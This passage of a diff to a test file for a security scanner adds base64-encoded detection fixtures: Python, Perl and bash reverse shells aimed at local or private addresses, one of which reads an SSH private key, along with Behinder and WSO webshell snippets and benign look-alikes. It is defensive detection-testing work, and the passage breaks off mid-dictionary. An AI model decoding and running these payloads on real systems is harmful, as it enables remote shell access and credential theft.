@@ -22,6 +22,7 @@ antivirus/Defender on test files containing real malware signatures.
 from __future__ import annotations
 
 import base64
+import json
 from pathlib import Path
 from unittest.mock import MagicMock
 
@@ -30,6 +31,8 @@ import pytest
 from skillspector.inspection_ledger import LedgerReason
 from skillspector.nodes.analyzers import static_yara
 from skillspector.nodes.analyzers.static_runner import MAX_FILE_CHARS
+from skillspector.nodes.deduplicate import deduplicate
+from skillspector.nodes.report import _compute_risk_score
 
 
 @pytest.fixture(autouse=True)
@@ -87,15 +90,802 @@ def _reverse_shell_fixture() -> str:
     return base64.b64decode("YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx").decode()
 
 
+def _multiline_python_socket_reverse_shell_fixture() -> str:
+    """A Python reverse shell written the way it appears in a real script file.
+
+    Deliberately multi-line (``socket.socket(...)`` and ``.connect(...)`` on
+    separate statements) rather than the single-line ``python3 -c '...'`` form,
+    since that is how this exact payload is written when bundled as a file
+    rather than passed inline to an interpreter.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgc3VicHJvY2Vzcywgb3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja"
+        "2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTAuMC4wLj"
+        "EiLCA0NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLCAwKQpvcy5kdXAyKHMuZmlsZW5vKCk"
+        "sIDEpCm9zLmR1cDIocy5maWxlbm8oKSwgMikKc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9z"
+        "aCIsICItaSJdKQo="
+    ).decode()
+
+
+def _benign_python_socket_client_fixture() -> str:
+    """An ordinary multiline Python TCP client — connects, exchanges data, closes.
+
+    No descriptor redirection (``os.dup2``) or shell execution follows the
+    ``connect()`` call, so this must NOT match ``reverse_shell``
+    even though it shares the same ``socket.socket(...)`` / ``.connect(...)``
+    shape as `_multiline_python_socket_reverse_shell_fixture`.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldApzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0"
+        "LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxMC4wLjAuMSIsIDQ0NDQpKQpzLnNlbmQoYiJHR"
+        "VQgLyBIVFRQLzEuMFxyXG5cclxuIikKZGF0YSA9IHMucmVjdig0MDk2KQpwcmludChkYXRhK"
+        "QpzLmNsb3NlKCkK"
+    ).decode()
+
+
+def _multiline_perl_socket_reverse_shell_fixture() -> str:
+    """A Perl reverse shell: connect, redirect STDIN/STDOUT/STDERR onto the
+    socket, then exec a shell. Mirrors the descriptor-redirection + exec shape
+    the ``reverse_shell_multiline`` heuristic requires, matching the Python
+    fixture's convention.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHBy"
+        "b3RvYnluYW1lKCJ0Y3AiKSk7CmlmIChjb25uZWN0KFNPQ0tFVCwgc29ja2FkZHJfaW4oJHBv"
+        "cnQsIGluZXRfYXRvbigkaXApKSkpIHsKICAgIG9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwog"
+        "ICAgb3BlbihTVERPVVQsICI+JlNPQ0tFVCIpOwogICAgb3BlbihTVERFUlIsICI+JlNPQ0tF"
+        "VCIpOwogICAgZXhlYygiL2Jpbi9zaCAtaSIpOwp9Cg=="
+    ).decode()
+
+
+def _benign_perl_socket_client_fixture() -> str:
+    """An ordinary Perl TCP client — connects, exchanges a line, closes.
+
+    No descriptor redirection or ``exec`` follows the ``connect()`` call, so
+    this must NOT match ``reverse_shell``.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHBy"
+        "b3RvYnluYW1lKCJ0Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkcG9ydCwg"
+        "aW5ldF9hdG9uKCRpcCkpKTsKcHJpbnQgU09DS0VUICJoZWxsb1xuIjsKbXkgJGxpbmUgPSA8"
+        "U09DS0VUPjsKY2xvc2UoU09DS0VUKTsK"
+    ).decode()
+
+
+def _python_helper_subprocess_fixture() -> str:
+    """A Python client that connects, then runs an unrelated helper subprocess.
+
+    No descriptor redirection (``os.dup2``) binds the socket to the child's
+    stdio, and the helper is not a shell — so this must NOT match
+    ``reverse_shell`` even though ``subprocess`` still
+    appears after ``.connect(...)``.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxMC4wLjAuMSIsIDQ0NDQpKQpzdWJwcm9jZXNzLmNhbGwoWyIvdXNyL2xvY2FsL2Jpbi9yZXBvcnQtc3RhdHVzLnNoIl0pCnMuc2VuZChiIm9rIikKcy5jbG9zZSgpCg=="
+    ).decode()
+
+
+def _python_stdin_reopen_no_shell_fixture() -> str:
+    """A Python client that redirects stdin onto the socket but never execs a shell.
+
+    ``os.dup2`` alone is not descriptor-redirection-plus-shell evidence — the
+    process just reads from its (now socket-backed) stdin and prints, so this
+    must NOT match ``reverse_shell``.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgb3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTAuMC4wLjEiLCA0NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLCAwKQpkYXRhID0gb3MucmVhZCgwLCA0MDk2KQpwcmludChkYXRhKQpzLmNsb3NlKCkK"
+    ).decode()
+
+
+def _perl_helper_exec_nonshell_fixture() -> str:
+    """A Perl client that connects, then execs an unrelated non-shell helper.
+
+    No STDIN/STDOUT/STDERR redirection onto the socket precedes the ``exec``,
+    and the executed program is not a shell — so this must NOT match
+    ``reverse_shell`` even though ``exec(`` still follows
+    ``connect(``.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkcG9ydCwgaW5ldF9hdG9uKCRpcCkpKTsKZXhlYygiL3Vzci9sb2NhbC9iaW4vcmVwb3J0LXN0YXR1cy5zaCIpOwo="
+    ).decode()
+
+
+def _perl_stdin_reopen_no_exec_fixture() -> str:
+    """A Perl client that reopens STDIN onto the socket but never execs.
+
+    ``open(STDIN, ...)`` alone is not redirection-plus-shell evidence — the
+    process just reads a line and prints it, so this must NOT match
+    ``reverse_shell``.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkcG9ydCwgaW5ldF9hdG9uKCRpcCkpKTsKb3BlbihTVERJTiwgIjwmU09DS0VUIik7Cm15ICRsaW5lID0gPFNURElOPjsKcHJpbnQgJGxpbmU7Cg=="
+    ).decode()
+
+
+def _python_dup2_execl_reverse_shell_fixture() -> str:
+    """A dup2-based Python reverse shell ending in ``os.execl``, not ``execve``.
+
+    The ``reverse_shell_multiline`` heuristic recognizes ``os.execl`` alongside
+    ``os.execve``, so this equally real ``os.execl("/bin/sh", "sh", "-i")`` form
+    is flagged (HIGH / 0.6).
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgb3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNv"
+        "Y2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTAuMC4wLjEiLCA0NDQ0KSkKb3MuZHVw"
+        "MihzLmZpbGVubygpLCAwKQpvcy5kdXAyKHMuZmlsZW5vKCksIDEpCm9zLmR1cDIocy5maWxl"
+        "bm8oKSwgMikKb3MuZXhlY2woIi9iaW4vc2giLCAic2giLCAiLWkiKQo="
+    ).decode()
+
+
+def _python_dup2_pty_spawn_reverse_shell_fixture() -> str:
+    """A dup2-based Python reverse shell ending in ``pty.spawn([...])``.
+
+    ``pty.spawn`` is commonly called with a list argument, the same as
+    ``subprocess.call``/``Popen``/``run``; the ``reverse_shell_multiline``
+    heuristic allows the optional ``[`` bracket on this form too, so it is
+    flagged (HIGH / 0.6).
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgb3MsIHB0eQpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5F"
+        "VCwgc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxMC4wLjAuMSIsIDQ0NDQpKQpv"
+        "cy5kdXAyKHMuZmlsZW5vKCksIDApCm9zLmR1cDIocy5maWxlbm8oKSwgMSkKb3MuZHVwMihz"
+        "LmZpbGVubygpLCAyKQpwdHkuc3Bhd24oWyIvYmluL3NoIiwgIi1pIl0pCg=="
+    ).decode()
+
+
+def _python_fileno_kwarg_reverse_shell_fixture() -> str:
+    """A Python reverse shell that redirects via ``stdin=``/``stdout=``/
+    ``stderr=`` keyword arguments to ``subprocess.call`` instead of ``os.dup2``.
+
+    Both forms wire the socket's descriptor onto the child's standard
+    streams; requiring ``dup2(`` unconditionally missed this equally valid
+    and commonly used form.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZf"
+        "SU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxMC4wLjAuMSIsIDQ0NDQp"
+        "KQpzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwgIi1pIl0sIHN0ZGluPXMuZmlsZW5vKCks"
+        "IHN0ZG91dD1zLmZpbGVubygpLCBzdGRlcnI9cy5maWxlbm8oKSkK"
+    ).decode()
+
+
+def _python_dup2_nonshell_helper_fixture() -> str:
+    """``os.dup2`` onto stdin followed by a non-shell helper whose name has
+    ``sh`` as a mere prefix (``sha256sum``), not a shell executable.
+
+    The shell-name alternatives had no boundary after ``sh``, so ``\\w*sh``
+    matched the leading two characters of ``sha256sum`` and misclassified
+    this as a CRITICAL ``reverse_shell``/YR1 finding.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgb3MsIHN1YnByb2Nlc3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0"
+        "LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTAuMC4wLjEiLCA0"
+        "NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLCAwKQpzdWJwcm9jZXNzLnJ1bihbInNoYTI1NnN1"
+        "bSJdKQo="
+    ).decode()
+
+
+def _python_dup2_unrelated_local_logging_fixture() -> str:
+    """A client that closes its socket, then redirects an unrelated log file's
+    descriptor onto stdout (``fd`` 1, never ``fd`` 0/stdin) before running a
+    shell for local housekeeping.
+
+    Requiring any ``dup2(`` accepted this local-logging redirection as
+    corroborating evidence even though the socket itself is never wired to
+    the shell's stdin — no remote command channel exists. Binding the
+    ``dup2`` evidence to descriptor 0 (stdin) excludes this.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgb3MsIHN1YnByb2Nlc3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0"
+        "LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTAuMC4wLjEiLCA0"
+        "NDQ0KSkKcy5zZW5kKGIiaGVhbHRoIGNoZWNrIikKcy5jbG9zZSgpCmxvZyA9IG9wZW4oIm91"
+        "dHB1dC5sb2ciLCAiYSIpCm9zLmR1cDIobG9nLmZpbGVubygpLCAxKQpzdWJwcm9jZXNzLnJ1"
+        "bihbIi9iaW4vc2giLCAiLWMiLCAiZGF0ZSJdKQo="
+    ).decode()
+
+
+def _multiline_perl_socket_reverse_shell_no_parens_fixture() -> str:
+    """A multiline Perl reverse shell using the parenthesis-free forms of
+    ``open`` and ``exec``, both valid Perl syntax.
+
+    Requiring parentheses around both calls missed this equally real form.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHBy"
+        "b3RvYnluYW1lKCJ0Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkcG9ydCwg"
+        "aW5ldF9hdG9uKCRpcCkpKTsKb3BlbiBTVERJTiwgIjwmU09DS0VUIjsKb3BlbiBTVERPVVQs"
+        "ICI+JlNPQ0tFVCI7Cm9wZW4gU1RERVJSLCAiPiZTT0NLRVQiOwpleGVjICIvYmluL3NoIiwg"
+        "Ii1pIjsK"
+    ).decode()
+
+
+def _perl_helper_exec_nonshell_prefix_fixture() -> str:
+    """Redirects STDIN onto the socket, then ``exec``s ``sha256sum`` — a
+    non-shell helper whose name merely has ``sh`` as a prefix.
+
+    Mirrors `_python_dup2_nonshell_helper_fixture`'s boundary gap for Perl.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHBy"
+        "b3RvYnluYW1lKCJ0Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkcG9ydCwg"
+        "aW5ldF9hdG9uKCRpcCkpKTsKb3BlbihTVERJTiwgIjwmU09DS0VUIik7CmV4ZWMoInNoYTI1"
+        "NnN1bSIpOwo="
+    ).decode()
+
+
+def _python_dup2_local_open_fixture() -> str:
+    """A client that closes its socket, opens an unrelated local file, and
+    ``dup2``s *that* file's descriptor onto stdin before running a shell.
+
+    The redirected descriptor comes from ``commands = open("local.commands")``,
+    a local file, never the (already closed) socket, so no remote command
+    channel exists. YARA cannot bind the descriptor to the connected socket, so
+    this shape is reported only by the reduced-severity
+    ``reverse_shell_multiline`` heuristic (HIGH / 0.6), never the certain
+    CRITICAL ``reverse_shell`` rule.
+    """
+    return base64.b64decode(
+        "cyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkK"
+        "cy5jb25uZWN0KCgiMTAuMC4wLjEiLCA0NDQ0KSkKcy5jbG9zZSgpCmNvbW1hbmRzID0gb3Bl"
+        "bigibG9jYWwuY29tbWFuZHMiKQpvcy5kdXAyKGNvbW1hbmRzLmZpbGVubygpLCAwKQpzdWJw"
+        "cm9jZXNzLnJ1bihbIi9iaW4vc2giXSkK"
+    ).decode()
+
+
+def _python_stdin_kwarg_local_open_fixture() -> str:
+    """The ``stdin=`` keyword-argument analogue of
+    `_python_dup2_local_open_fixture`: the redirected descriptor comes from a
+    local ``open()`` call, never the socket, so this must NOT match either.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZf"
+        "SU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxMC4wLjAuMSIsIDQ0NDQp"
+        "KQpjb21tYW5kcyA9IG9wZW4oImxvY2FsLmNvbW1hbmRzIikKc3VicHJvY2Vzcy5jYWxsKFsi"
+        "L2Jpbi9zaCJdLCBzdGRpbj1jb21tYW5kcy5maWxlbm8oKSkK"
+    ).decode()
+
+
+def _python_dup2_sh_helper_hyphen_fixture() -> str:
+    """``os.dup2`` onto stdin followed by a non-shell helper whose name has
+    ``sh`` as a mere prefix before a hyphen (``sh-helper``), not a shell
+    executable.
+
+    ``\\b`` transitions on any non-word character, and ``-`` is non-word, so
+    the shell-name alternatives matched ``sh`` inside ``sh-helper`` the same
+    way they previously matched it inside ``sha256sum``.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgb3MsIHN1YnByb2Nlc3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0"
+        "LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTAuMC4wLjEiLCA0"
+        "NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLCAwKQpzdWJwcm9jZXNzLnJ1bihbInNoLWhlbHBl"
+        "ciJdKQo="
+    ).decode()
+
+
+def _perl_local_input_no_amp_fixture() -> str:
+    """Redirects Perl's ``STDIN`` from a local file path, not the socket, then
+    ``exec``s a shell.
+
+    The dup-onto-a-handle idiom (``open(STDIN, "<&SOCKET")``) always uses the
+    ``&`` fd-duplication form; plain filename opens (``open(STDIN, "<",
+    "local.commands")``) read from local disk instead, so this must NOT
+    match ``reverse_shell``.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHBy"
+        "b3RvYnluYW1lKCJ0Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkcG9ydCwg"
+        "aW5ldF9hdG9uKCRpcCkpKTsKb3BlbihTVERJTiwgIjwiLCAibG9jYWwuY29tbWFuZHMiKTsK"
+        "ZXhlYygiL2Jpbi9zaCIpOwo="
+    ).decode()
+
+
+def _perl_local_output_no_amp_fixture() -> str:
+    """The ``STDOUT`` analogue of `_perl_local_input_no_amp_fixture`: output
+    redirected to a local log file, not the socket, must also NOT match.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHBy"
+        "b3RvYnluYW1lKCJ0Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkcG9ydCwg"
+        "aW5ldF9hdG9uKCRpcCkpKTsKb3BlbihTVERPVVQsICI+IiwgImxvY2FsLmxvZyIpOwpleGVj"
+        "KCIvYmluL3NoIik7Cg=="
+    ).decode()
+
+
+def _perl_sh_helper_hyphen_fixture() -> str:
+    """Redirects ``STDIN`` onto the socket, then ``exec``s ``sh-helper`` — a
+    non-shell helper whose name merely has ``sh`` as a prefix before a
+    hyphen.
+
+    Mirrors `_python_dup2_sh_helper_hyphen_fixture`'s boundary gap for Perl.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHBy"
+        "b3RvYnluYW1lKCJ0Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkcG9ydCwg"
+        "aW5ldF9hdG9uKCRpcCkpKTsKb3BlbihTVERJTiwgIjwmU09DS0VUIik7CmV4ZWMoInNoLWhl"
+        "bHBlciIpOwo="
+    ).decode()
+
+
+_WEBSHELL_FIXTURES = {
+    "behinder_php": "PD9waHAgQGVycm9yX3JlcG9ydGluZygwKTsgc2Vzc2lvbl9zdGFydCgpOyAka2V5PSJlNDVlMzI5ZmViNWQ5MjViIjsKJF9TRVNTSU9OWydrJ109JGtleTsgJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CiRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOyBldmFsKCRwb3N0KTsgPz4K",
+    "behinder_jsp": "PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qIiU+CjwlIFN0cmluZyBrPSJlNDVlMzI5ZmViNWQ5MjViIjsgc2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7CkNpcGhlciBjPUNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7ICU+Cg==",
+    "wso_php": "PD9waHAgZGVmaW5lKCdXU09fVkVSU0lPTicsICcyLjUnKTsKZnVuY3Rpb24gd3NvRXgoJGluKSB7ICRvdXQ9Jyc7IGlmKGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKSB7IEBleGVjKCRpbiwkb3V0KTsgfQpyZXR1cm4gJG91dDsgfQo=",
+    "wso_mixed_case": "PD9waHAgZGVmaW5lKCJ3c29fdmVyc2lvbiIsICIyLjciKTsKZnVuY3Rpb24gV1NPRVgoJGluKSB7IHJldHVybiAkaW47IH0K",
+}
+
+
+def _webshell_fixture(name: str) -> str:
+    return base64.b64decode(_WEBSHELL_FIXTURES[name]).decode()
+
+
+def _python_read_file_between_connect_and_shell_fixture() -> str:
+    """A real reverse shell that reads a local file (``key = open(...).read()``)
+    between ``connect`` and ``os.dup2``.
+
+    A ``= open(`` anywhere in the script must never cancel otherwise valid
+    socket-redirection-plus-shell evidence; the socket's descriptor is still
+    wired onto stdin and a shell is still executed.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgb3MsIHN1YnByb2Nlc3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0"
+        "LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTAuMC4wLjEiLCA0"
+        "NDQ0KSkKa2V5ID0gb3Blbihvcy5wYXRoLmV4cGFuZHVzZXIoIn4vLnNzaC9pZF9yc2EiKSku"
+        "cmVhZCgpCm9zLmR1cDIocy5maWxlbm8oKSwgMCkKb3MuZHVwMihzLmZpbGVubygpLCAxKQpv"
+        "cy5kdXAyKHMuZmlsZW5vKCksIDIpCnN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCAiLWki"
+        "XSkK"
+    ).decode()
+
+
+def _python_probe_socket_then_clean_reverse_shell_fixture() -> str:
+    """A probe socket plus ``host = open(...).read()``, then a second, clean
+    ``socket``/``connect``/``os.dup2``/``subprocess.call(["/bin/sh", "-i"])``.
+
+    One tainted ``= open(`` span must not suppress a later, independent and
+    genuine reverse shell in the same file.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgb3MsIHN1YnByb2Nlc3MKcHJvYmUgPSBzb2NrZXQuc29ja2V0KHNv"
+        "Y2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCnByb2JlLmNvbm5lY3QoKCIxMC4w"
+        "LjAuMiIsIDkwMDApKQpob3N0ID0gb3BlbigiL2V0Yy9ob3N0bmFtZSIpLnJlYWQoKQpwcm9i"
+        "ZS5jbG9zZSgpCnMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09D"
+        "S19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMC4xIiwgNDQ0NCkpCm9zLmR1cDIocy5maWxl"
+        "bm8oKSwgMCkKb3MuZHVwMihzLmZpbGVubygpLCAxKQpvcy5kdXAyKHMuZmlsZW5vKCksIDIp"
+        "CnN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCAiLWkiXSkK"
+    ).decode()
+
+
+def _python_reverse_shell_with_cleanup_open_fixture() -> str:
+    """A genuine reverse shell followed by a cleanup ``marker = open(...)`` and
+    a second ``subprocess.call(["sh", "-c", ...])``.
+
+    A trailing ``= open(`` must not cancel the earlier socket-plus-shell match.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgb3MsIHN1YnByb2Nlc3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0"
+        "LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTAuMC4wLjEiLCA0"
+        "NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLCAwKQpvcy5kdXAyKHMuZmlsZW5vKCksIDEpCm9z"
+        "LmR1cDIocy5maWxlbm8oKSwgMikKc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsICItaSJd"
+        "KQptYXJrZXIgPSBvcGVuKCIvdG1wL2RvbmUubWFya2VyIiwgInciKQpzdWJwcm9jZXNzLmNh"
+        "bGwoWyJzaCIsICItYyIsICJlY2hvIGRvbmUiXSkK"
+    ).decode()
+
+
+def _python_dup2_loop_reverse_shell_fixture() -> str:
+    """A multiline reverse shell that redirects via a
+    ``for fd in (0, 1, 2): os.dup2(s.fileno(), fd)`` loop.
+
+    The loop form carries the socket descriptor onto every standard stream;
+    the stricter multiline evidence must recognize it.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgb3MsIHN1YnByb2Nlc3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0"
+        "LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTAuMC4wLjEiLCA0"
+        "NDQ0KSkKZm9yIGZkIGluICgwLCAxLCAyKToKICAgIG9zLmR1cDIocy5maWxlbm8oKSwgZmQp"
+        "CnN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCAiLWkiXSkK"
+    ).decode()
+
+
+def _python_with_open_local_commands_fixture() -> str:
+    """The idiomatic ``with open("local.commands") as commands:`` form that
+    redirects a *local* file descriptor onto stdin, after the socket is closed.
+
+    YARA cannot bind the redirected descriptor to the connected socket, so
+    this is indistinguishable from a real shell at the pattern level; it must
+    therefore be reported at reduced severity (the ``reverse_shell_multiline``
+    heuristic), never as a CRITICAL ``reverse_shell``.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgb3MsIHN1YnByb2Nlc3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0"
+        "LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTAuMC4wLjEiLCA0"
+        "NDQ0KSkKcy5jbG9zZSgpCndpdGggb3BlbigibG9jYWwuY29tbWFuZHMiKSBhcyBjb21tYW5k"
+        "czoKICAgIG9zLmR1cDIoY29tbWFuZHMuZmlsZW5vKCksIDApCiAgICBzdWJwcm9jZXNzLnJ1"
+        "bihbIi9iaW4vc2giXSkK"
+    ).decode()
+
+
+def _perl_local_cmds_dup_fixture() -> str:
+    """Perl ``open(CMDS, "<", "local.commands"); open(STDIN, "<&CMDS")`` after a
+    closed socket, then ``exec("/bin/sh")``.
+
+    The ``<&`` dup is from a *local* file handle, not the socket; because the
+    operand cannot be bound to the socket, this is reported only at reduced
+    severity, never CRITICAL.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHBy"
+        "b3RvYnluYW1lKCJ0Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkcG9ydCwg"
+        "aW5ldF9hdG9uKCRpcCkpKTsKY2xvc2UoU09DS0VUKTsKb3BlbihDTURTLCAiPCIsICJsb2Nh"
+        "bC5jb21tYW5kcyIpOwpvcGVuKFNURElOLCAiPCZDTURTIik7CmV4ZWMoIi9iaW4vc2giKTsK"
+    ).decode()
+
+
+def _perl_three_arg_dup_fixture() -> str:
+    """Perl three-argument ``open(STDIN, "<&", $fh)`` dup after a closed socket,
+    then ``exec("/bin/sh")``.
+
+    ``$fh`` is an unbound handle; like the two-argument local-dup form, this is
+    reported at reduced severity, never CRITICAL.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHBy"
+        "b3RvYnluYW1lKCJ0Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkcG9ydCwg"
+        "aW5ldF9hdG9uKCRpcCkpKTsKY2xvc2UoU09DS0VUKTsKb3BlbihTVERJTiwgIjwmIiwgJGZo"
+        "KTsKZXhlYygiL2Jpbi9zaCIpOwo="
+    ).decode()
+
+
+def _bash_reverse_shell_after_open_line_fixture() -> str:
+    """A bash TCP reverse-shell payload several lines below an unrelated
+    ``settings = open("settings.ini")`` line.
+
+    The finding must be located at the shell payload, not pulled up to the
+    earlier ``open`` line.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IG9zCnNldHRpbmdzID0gb3Blbigic2V0dGluZ3MuaW5pIikKaG9zdCA9ICIxMjcu"
+        "MC4wLjEiCnBvcnQgPSA0NDQ0CnBheWxvYWQgPSAiY29ubmVjdCBiYWNrIgpvcy5zeXN0ZW0o"
+        "ImJhc2ggLWkgPiYgL2Rldi90Y3AvMTI3LjAuMC4xLzQ0NDQgMD4mMSIpCg=="
+    ).decode()
+
+
+def _single_line_python_socket_shells() -> dict[str, str]:
+    """Single-line Python socket reverse shells that ``main``'s single-line
+    ``$python_socket`` detects. Each keeps ``socket.socket(...SOCK_STREAM...)``
+    and ``.connect(`` on one line, so restoring main's string must keep them
+    CRITICAL regardless of the specific descriptor/exec form that follows.
+
+    These are complete, signature-triggering reverse-shell one-liners, so — like
+    every other such fixture in this module (see
+    `_multiline_python_socket_reverse_shell_fixture`) — they are stored
+    base64-encoded to keep Defender and similar on-access scanners from
+    quarantining this test file.
+    """
+    return {
+        "dup2_list_comprehension": base64.b64decode(
+            "cyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsg"
+            "cy5jb25uZWN0KCgiMTAuMC4wLjEiLDQ0NDQpKTsgW29zLmR1cDIocy5maWxlbm8oKSxmZCkg"
